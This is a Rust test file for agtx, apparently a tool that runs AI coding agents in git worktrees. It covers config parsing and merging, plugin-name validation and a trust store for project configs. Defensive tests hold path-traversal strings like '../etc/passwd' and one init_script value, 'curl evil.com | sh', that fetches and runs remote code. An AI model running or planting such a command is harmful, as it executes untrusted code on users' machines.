use agtx::config::{
    determine_first_run_action, FirstRunAction, GlobalConfig, MergedConfig, PhaseAgentsConfig,
    ProjectConfig, ThemeConfig, WorktreeConfig,
};

// === ThemeConfig Tests ===

#[test]
fn test_parse_hex_valid() {
    assert_eq!(ThemeConfig::parse_hex("#FFFFFF"), Some((255, 255, 255)));
    assert_eq!(ThemeConfig::parse_hex("#000000"), Some((0, 0, 0)));
    assert_eq!(ThemeConfig::parse_hex("#FF0000"), Some((255, 0, 0)));
    assert_eq!(ThemeConfig::parse_hex("#00FF00"), Some((0, 255, 0)));
    assert_eq!(ThemeConfig::parse_hex("#0000FF"), Some((0, 0, 255)));
    assert_eq!(ThemeConfig::parse_hex("#5cfff7"), Some((92, 255, 247)));
}

#[test]
fn test_parse_hex_without_hash() {
    assert_eq!(ThemeConfig::parse_hex("FFFFFF"), Some((255, 255, 255)));
    assert_eq!(ThemeConfig::parse_hex("000000"), Some((0, 0, 0)));
}

#[test]
fn test_parse_hex_invalid() {
    assert_eq!(ThemeConfig::parse_hex("#FFF"), None); // Too short
    assert_eq!(ThemeConfig::parse_hex("#FFFFFFF"), None); // Too long
    assert_eq!(ThemeConfig::parse_hex("#GGGGGG"), None); // Invalid hex chars
    assert_eq!(ThemeConfig::parse_hex(""), None); // Empty
}

#[test]
fn test_theme_config_default() {
    let theme = ThemeConfig::default();

    // Verify all default colors are valid hex
    assert!(ThemeConfig::parse_hex(&theme.color_selected).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_normal).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_dimmed).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_text).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_accent).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_description).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_column_header).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_popup_border).is_some());
    assert!(ThemeConfig::parse_hex(&theme.color_popup_header).is_some());
}

// === GlobalConfig Tests ===

#[test]
fn test_global_config_default() {
    let config = GlobalConfig::default();

    assert_eq!(config.default_agent, "claude");
    assert!(config.worktree.enabled);
    assert!(config.worktree.auto_cleanup);
    assert_eq!(config.worktree.base_branch, "");
}

// === WorktreeConfig Tests ===

#[test]
fn test_worktree_config_default() {
    let config = WorktreeConfig::default();

    assert!(config.enabled);
    assert!(config.auto_cleanup);
    assert_eq!(config.base_branch, "");
}

// === ProjectConfig Tests ===

#[test]
fn test_project_config_default() {
    let config = ProjectConfig::default();

    assert!(config.default_agent.is_none());
    assert!(config.base_branch.is_none());
    assert!(config.github_url.is_none());
    assert!(config.copy_files.is_none());
    assert!(config.init_script.is_none());
    assert!(config.cleanup_script.is_none());
}

// === MergedConfig Tests ===

#[test]
fn test_merged_config_uses_global_defaults() {
    let global = GlobalConfig::default();
    let project = ProjectConfig::default();

    let merged = MergedConfig::merge(&global, &project);

    assert_eq!(merged.default_agent, "claude");
    assert_eq!(merged.base_branch, "");
    assert!(merged.worktree_enabled);
    assert!(merged.auto_cleanup);
    assert!(merged.copy_files.is_none());
    assert!(merged.init_script.is_none());
    assert!(merged.cleanup_script.is_none());
}

#[test]
fn test_merged_config_project_overrides() {
    let global = GlobalConfig::default();
    let project = ProjectConfig {
        default_agent: Some("codex".to_string()),
        agents: None,
        base_branch: Some("develop".to_string()),
        worktree_dir: None,
        github_url: Some("https://github.com/user/repo".to_string()),
        copy_files: Some(".env, .env.local".to_string()),
        init_script: Some("npm install".to_string()),
        cleanup_script: Some("scripts/cleanup.sh".to_string()),
        branch_prefix: None,
        workflow_plugin: None,
        skip_worktree: None,
    };

    let merged = MergedConfig::merge(&global, &project);

    assert_eq!(merged.default_agent, "codex");
    assert_eq!(merged.base_branch, "develop");
    assert_eq!(
        merged.github_url,
        Some("https://github.com/user/repo".to_string())
    );
    assert_eq!(merged.copy_files, Some(".env, .env.local".to_string()));
    assert_eq!(merged.init_script, Some("npm install".to_string()));
    // worktree_dir not overridden, uses global default
    assert_eq!(merged.worktree_dir, ".agtx/worktrees");
    // branch_prefix not overridden, uses global default
    assert_eq!(merged.branch_prefix, "task");
    assert_eq!(
        merged.cleanup_script,
        Some("scripts/cleanup.sh".to_string())
    );
}

#[test]
fn test_merged_config_worktree_dir_override() {
    let global = GlobalConfig::default();
    let project = ProjectConfig {
        worktree_dir: Some(".worktrees".to_string()),
        ..Default::default()
    };

    let merged = MergedConfig::merge(&global, &project);
    assert_eq!(merged.worktree_dir, ".worktrees");
}

#[test]
fn test_merged_config_worktree_dir_global() {
    let mut global = GlobalConfig::default();
    global.worktree.worktree_dir = ".wt".to_string();
    let project = ProjectConfig::default();

    let merged = MergedConfig::merge(&global, &project);
    assert_eq!(merged.worktree_dir, ".wt");
}

// === FirstRunAction Tests ===

#[test]
fn test_first_run_config_exists() {
    assert_eq!(
        determine_first_run_action(true, false, false),
        FirstRunAction::ConfigExists,
    );
}

#[test]
fn test_first_run_config_exists_ignores_other_flags() {
    // Config exists takes priority over everything
    assert_eq!(
        determine_first_run_action(true, true, true),
        FirstRunAction::ConfigExists,
    );
}

#[test]
fn test_first_run_migrated() {
    assert_eq!(
        determine_first_run_action(false, true, false),
        FirstRunAction::Migrated,
    );
}

#[test]
fn test_first_run_migrated_with_db() {
    // Migration takes priority over DB existence
    assert_eq!(
        determine_first_run_action(false, true, true),
        FirstRunAction::Migrated,
    );
}

#[test]
fn test_first_run_existing_user_save_defaults() {
    assert_eq!(
        determine_first_run_action(false, false, true),
        FirstRunAction::ExistingUserSaveDefaults,
    );
}

#[test]
fn test_first_run_new_user_prompt() {
    assert_eq!(
        determine_first_run_action(false, false, false),
        FirstRunAction::NewUserPrompt,
    );
}

// === PhaseAgentsConfig Tests ===

#[test]
fn test_agent_for_phase_all_defaults() {
    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    assert_eq!(config.agent_for_phase("research"), "claude");
    assert_eq!(config.agent_for_phase("planning"), "claude");
    assert_eq!(config.agent_for_phase("running"), "claude");
    assert_eq!(config.agent_for_phase("review"), "claude");
    assert_eq!(config.agent_for_phase("unknown"), "claude");
}

#[test]
fn test_agent_for_phase_global_overrides() {
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());
    global.agents.review = Some("gemini".to_string());

    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    assert_eq!(config.agent_for_phase("research"), "claude");
    assert_eq!(config.agent_for_phase("planning"), "claude");
    assert_eq!(config.agent_for_phase("running"), "codex");
    assert_eq!(config.agent_for_phase("review"), "gemini");
}

#[test]
fn test_agent_for_phase_project_overrides_global() {
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());

    let project = ProjectConfig {
        agents: Some(PhaseAgentsConfig {
            running: Some("gemini".to_string()),
            ..Default::default()
        }),
        ..Default::default()
    };

    let config = MergedConfig::merge(&global, &project);
    // Project override wins
    assert_eq!(config.agent_for_phase("running"), "gemini");
    // Unset phases fall back to default_agent
    assert_eq!(config.agent_for_phase("planning"), "claude");
}

#[test]
fn test_agent_for_phase_project_default_agent() {
    let project = ProjectConfig {
        default_agent: Some("codex".to_string()),
        ..Default::default()
    };

    let config = MergedConfig::merge(&GlobalConfig::default(), &project);
    // All phases fall back to project's default_agent
    assert_eq!(config.agent_for_phase("research"), "codex");
    assert_eq!(config.agent_for_phase("running"), "codex");
}

#[test]
fn test_agent_for_phase_planning_with_research() {
    let mut global = GlobalConfig::default();
    global.agents.planning = Some("gemini".to_string());

    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    // "planning_with_research" maps to the planning agent
    assert_eq!(config.agent_for_phase("planning_with_research"), "gemini");
}

#[test]
fn test_explicit_agent_for_phase_returns_none_when_unset() {
    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    // No [agents] section — all phases return None
    assert_eq!(config.explicit_agent_for_phase("research"), None);
    assert_eq!(config.explicit_agent_for_phase("planning"), None);
    assert_eq!(config.explicit_agent_for_phase("running"), None);
    assert_eq!(config.explicit_agent_for_phase("review"), None);
}

#[test]
fn test_explicit_agent_for_phase_returns_some_when_set() {
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());

    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    assert_eq!(config.explicit_agent_for_phase("running"), Some("codex"));
    assert_eq!(config.explicit_agent_for_phase("review"), None);
}

#[test]
fn test_phase_agents_config_serde_roundtrip() {
    let toml_str = r#"
default_agent = "claude"

[agents]
running = "codex"
review = "gemini"
"#;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert_eq!(config.agents.running, Some("codex".to_string()));
    assert_eq!(config.agents.review, Some("gemini".to_string()));
    assert_eq!(config.agents.research, None);
    assert_eq!(config.agents.planning, None);
}

#[test]
fn test_phase_agents_config_backwards_compatible() {
    // Config without [agents] section should parse fine
    let toml_str = r#"
default_agent = "claude"
"#;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert_eq!(config.agents.research, None);
    assert_eq!(config.agents.planning, None);
    assert_eq!(config.agents.running, None);
    assert_eq!(config.agents.review, None);
}

#[test]
fn test_fullscreen_on_enter_defaults_to_false() {
    let config: GlobalConfig = toml::from_str("").unwrap();
    assert!(!config.fullscreen_on_enter);
}

#[test]
fn test_fullscreen_on_enter_set_true() {
    let toml_str = r#"
fullscreen_on_enter = true
"#;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert!(config.fullscreen_on_enter);
}

#[test]
fn test_fullscreen_on_enter_merged() {
    let mut global = GlobalConfig::default();
    global.fullscreen_on_enter = true;
    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    assert!(config.fullscreen_on_enter);
}

#[test]
fn test_fullscreen_on_enter_from_real_config() {
    let toml_str = r##"
default_agent = "claude"
fullscreen_on_enter = true

[worktree]
enabled = true

[theme]
color_selected = "#ead49a"
"##;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert!(config.fullscreen_on_enter);
    assert_eq!(config.default_agent, "claude");
}

#[test]
fn test_fullscreen_on_enter_exact_user_config() {
    let toml_str = r##"
default_agent = "claude"
fullscreen_on_enter = true

[agents]

[worktree]
enabled = true
auto_cleanup = true
base_branch = ""
worktree_dir = ".worktrees"

[theme]
color_selected = "#ead49a"
color_normal = "#5cfff7"
color_dimmed = "#9C9991"
color_text = "#f2ece6"
color_accent = "#5cfff7"
color_description = "#C4B0AC"
color_column_header = "#a0d2fa"
color_popup_border = "#9ffcf8"
color_popup_header = "#69fae7"
"##;
    let config: GlobalConfig = toml::from_str(toml_str).unwrap();
    assert!(
        config.fullscreen_on_enter,
        "fullscreen_on_enter should be true"
    );
    let merged = MergedConfig::merge(&config, &ProjectConfig::default());
    assert!(
        merged.fullscreen_on_enter,
        "merged fullscreen_on_enter should be true"
    );
}

// === Plugin Name Validation Tests (Fix 1) ===

use agtx::config::WorkflowPlugin;

#[test]
fn test_plugin_name_rejects_path_traversal() {
    assert!(WorkflowPlugin::validate_plugin_name("../etc").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo/bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo\\bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("..").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("").is_err());
}

#[test]
fn test_plugin_name_rejects_dot_prefix() {
    assert!(WorkflowPlugin::validate_plugin_name(".hidden").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("..sneaky").is_err());
}

#[test]
fn test_plugin_name_rejects_special_characters() {
    assert!(WorkflowPlugin::validate_plugin_name("foo bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo@bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("foo$bar").is_err());
    assert!(WorkflowPlugin::validate_plugin_name("../../etc/passwd").is_err());
}

#[test]
fn test_plugin_name_accepts_valid_names() {
    assert!(WorkflowPlugin::validate_plugin_name("agtx").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("spec-kit").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("my_plugin_2").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("GSD").is_ok());
    assert!(WorkflowPlugin::validate_plugin_name("a").is_ok());
}

#[test]
fn test_plugin_dir_returns_none_for_invalid_name() {
    // Path traversal names should return None, not panic
    assert!(WorkflowPlugin::plugin_dir("../evil", None).is_none());
    assert!(WorkflowPlugin::plugin_dir("", None).is_none());
    assert!(WorkflowPlugin::plugin_dir("foo/bar", None).is_none());
}

#[test]
fn test_plugin_load_rejects_invalid_name() {
    let result = WorkflowPlugin::load("../etc/passwd", None);
    assert!(result.is_err());
    let err_msg = result.unwrap_err().to_string();
    assert!(err_msg.contains("invalid characters"));
}

// === TrustStore Tests (Fix 9) ===

use agtx::config::TrustStore;
use tempfile::TempDir;

#[test]
fn test_trust_store_default_is_empty() {
    let store = TrustStore::default();
    assert!(store.projects.is_empty());
}

#[test]
fn test_trust_store_is_trusted_no_config_file() {
    // A project with no .agtx/config.toml should be trusted (nothing to distrust)
    let temp_dir = TempDir::new().unwrap();
    let store = TrustStore::default();
    assert!(store.is_trusted(temp_dir.path()));
}

#[test]
fn test_trust_store_untrusted_when_config_exists_but_not_stored() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::write(
        config_dir.join("config.toml"),
        "init_script = \"echo hello\"",
    )
    .unwrap();

    let store = TrustStore::default();
    // Config exists but no stored hash — untrusted
    assert!(!store.is_trusted(temp_dir.path()));
}

#[test]
fn test_trust_store_hash_config_returns_some_when_config_exists() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::write(
        config_dir.join("config.toml"),
        "init_script = \"echo hello\"",
    )
    .unwrap();

    let hash = TrustStore::hash_config(temp_dir.path());
    assert!(hash.is_some());
    // SHA-256 hex digest is 64 chars
    assert_eq!(hash.unwrap().len(), 64);
}

#[test]
fn test_trust_store_hash_config_returns_none_when_no_config() {
    let temp_dir = TempDir::new().unwrap();
    let hash = TrustStore::hash_config(temp_dir.path());
    assert!(hash.is_none());
}

#[test]
fn test_trust_store_hash_config_is_deterministic() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();
    std::fs::write(
        config_dir.join("config.toml"),
        "init_script = \"npm install\"",
    )
    .unwrap();

    let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
    let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
    assert_eq!(hash1, hash2);
}

#[test]
fn test_trust_store_hash_changes_when_config_changes() {
    let temp_dir = TempDir::new().unwrap();
    let config_dir = temp_dir.path().join(".agtx");
    std::fs::create_dir_all(&config_dir).unwrap();

    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo v1\"").unwrap();
    let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();

    std::fs::write(
        config_dir.join("config.toml"),
        "init_script = \"curl evil.com | sh\"",
    )
    .unwrap();
    let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();

    assert_ne!(hash1, hash2);
}

// === FeatureFlags Tests (Fix 4) ===

use agtx::FeatureFlags;

#[test]
fn test_feature_flags_default() {
    let flags = FeatureFlags::default();
    assert!(!flags.experimental);
    assert!(!flags.no_init_scripts);
}

#[test]
fn test_feature_flags_no_init_scripts() {
    let flags = FeatureFlags {
        experimental: false,
        no_init_scripts: true,
        first_run: false,
    };
    assert!(flags.no_init_scripts);
    assert!(!flags.experimental);
}

// =============================================================================
// Comment-preserving config writes
//
// `toml::to_string_pretty` round-trips through the struct and emits a pristine
// file, destroying every comment and unrecognised key the user wrote. That was
// tolerable while the only writer was the first-run default; these pin the
// behaviour agtx needs now that it offers to edit a file people maintain by
// hand.
// =============================================================================

fn project_with_config(body: &str) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
    std::fs::write(dir.path().join(".agtx/config.toml"), body).unwrap();
    dir
}

fn read_config(dir: &tempfile::TempDir) -> String {
    std::fs::read_to_string(dir.path().join(".agtx/config.toml")).unwrap()
}

#[test]
fn saving_keeps_comments_and_unknown_keys() {
    let dir = project_with_config(concat!(
        "# how this project is set up\n",
        "workflow_plugin = \"gsd\"  # the team standard\n",
        "\n",
        "# not an agtx key at all\n",
        "[experiment]\n",
        "enabled = true\n",
    ));

    let mut config = ProjectConfig::load(dir.path()).unwrap();
    config.base_branch = Some("develop".to_string());
    config.save(dir.path()).unwrap();

    let text = read_config(&dir);
    assert!(text.contains("# how this project is set up"), "{text}");
    assert!(text.contains("# the team standard"), "{text}");
    assert!(text.contains("# not an agtx key at all"), "{text}");
    assert!(text.contains("[experiment]"), "{text}");
    assert!(text.contains("enabled = true"), "{text}");
    assert!(text.contains("develop"), "the new value landed: {text}");

    // And it is still valid, still loadable.
    let back = ProjectConfig::load(dir.path()).unwrap();
    assert_eq!(back.base_branch.as_deref(), Some("develop"));
    assert_eq!(back.workflow_plugin.as_deref(), Some("gsd"));
}

#[test]
fn clearing_a_field_removes_it_from_the_file() {
    let dir = project_with_config("init_script = \"npm ci\"\nworkflow_plugin = \"gsd\"\n");

    let mut config = ProjectConfig::load(dir.path()).unwrap();
    config.init_script = None;
    config.save(dir.path()).unwrap();

    let text = read_config(&dir);
    assert!(
        !text.contains("init_script"),
        "cleared field lingered: {text}"
    );
    assert!(text.contains("workflow_plugin"), "{text}");
    assert_eq!(ProjectConfig::load(dir.path()).unwrap().init_script, None);
}

/// A comment lives in the *following* key's decor, so deleting the first key in
/// a file would take the file's header comment with it.
#[test]
fn removing_the_first_key_does_not_take_the_header_comment() {
    let dir = project_with_config(concat!(
        "# project settings\n",
        "init_script = \"npm ci\"\n",
        "workflow_plugin = \"gsd\"\n",
    ));

    let mut config = ProjectConfig::load(dir.path()).unwrap();
    config.init_script = None;
    config.save(dir.path()).unwrap();

    let text = read_config(&dir);
    assert!(text.contains("# project settings"), "{text}");
    assert!(!text.contains("init_script"), "{text}");
}

/// serde renders a nested struct as an inline table. Merged as-is that would
/// collapse the user's `[worktree]` section onto one line, comments and all.
#[test]
fn nested_sections_stay_sections() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".agtx")).unwrap();
    std::fs::write(
        dir.path().join(".agtx/config.toml"),
        concat!(
            "# per-phase agents\n",
            "[agents]\n",
            "planning = \"claude\"\n",
        ),
    )
    .unwrap();

    let mut config = ProjectConfig::load(dir.path()).unwrap();
    config.agents.as_mut().unwrap().running = Some("codex".to_string());
    config.save(dir.path()).unwrap();

    let text = read_config(&dir);
    assert!(text.contains("[agents]"), "section flattened: {text}");
    assert!(!text.contains("agents = {"), "written inline: {text}");
    assert!(text.contains("# per-phase agents"), "{text}");

    let back = ProjectConfig::load(dir.path()).unwrap();
    let agents = back.agents.unwrap();
    assert_eq!(agents.planning.as_deref(), Some("claude"));
    assert_eq!(agents.running.as_deref(), Some("codex"));
}

#[test]
fn clearing_a_nested_field_removes_it() {
    let dir = project_with_config("[agents]\nplanning = \"claude\"\nrunning = \"codex\"\n");

    let mut config = ProjectConfig::load(dir.path()).unwrap();
    config.agents.as_mut().unwrap().running = None;
    config.save(dir.path()).unwrap();

    let text = read_config(&dir);
    assert!(text.contains("planning"), "{text}");
    assert!(!text.contains("running"), "{text}");
}

/// A file that does not parse is not something to merge into — but neither is
/// it a reason to fail. The old writer always overwrote; that stays true for
/// the one case where preserving is impossible.
#[test]
fn an_unparseable_file_is_replaced_rather_than_erroring() {
    let dir = project_with_config("this is not = = toml\n");

    let config = ProjectConfig {
        workflow_plugin: Some("gsd".to_string()),
        ..Default::default()
    };
    config.save(dir.path()).unwrap();

    let back = ProjectConfig::load(dir.path()).unwrap();
    assert_eq!(back.workflow_plugin.as_deref(), Some("gsd"));
}

#[test]
fn saving_into_a_directory_that_does_not_exist_yet_works() {
    let dir = tempfile::tempdir().unwrap();
    let config = ProjectConfig {
        workflow_plugin: Some("gsd".to_string()),
        ..Default::default()
    };
    config.save(dir.path()).unwrap();

    assert!(dir.path().join(".agtx/config.toml").exists());
    assert_eq!(
        ProjectConfig::load(dir.path())
            .unwrap()
            .workflow_plugin
            .as_deref(),
        Some("gsd")
    );
}

/// A fresh file should look like the format the README documents, not like a
/// wall of inline tables.
#[test]
fn a_fresh_global_config_is_written_as_sections() {
    let dir = tempfile::tempdir().unwrap();
    std::env::set_var("AGTX_CONFIG_DIR", dir.path());

    GlobalConfig::default().save().unwrap();
    let text = std::fs::read_to_string(dir.path().join("config.toml")).unwrap();

    std::env::remove_var("AGTX_CONFIG_DIR");

    assert!(text.contains("[worktree]"), "{text}");
    assert!(text.contains("[theme]"), "{text}");
    assert!(!text.contains("worktree = {"), "{text}");
    assert!(text.contains("default_agent = \"claude\""), "{text}");
}

/// `agents` is optional on `ProjectConfig`, so clearing it has to take the
/// whole section — not leave an empty `[agents]` header behind.
#[test]
fn clearing_the_agents_section_removes_it_entirely() {
    let dir = project_with_config("[agents]\nplanning = \"claude\"\n");

    let mut config = ProjectConfig::load(dir.path()).unwrap();
    config.agents = None;
    config.save(dir.path()).unwrap();

    let text = read_config(&dir);
    assert!(!text.contains("[agents]"), "empty section lingered: {text}");
    assert!(ProjectConfig::load(dir.path()).unwrap().agents.is_none());
}
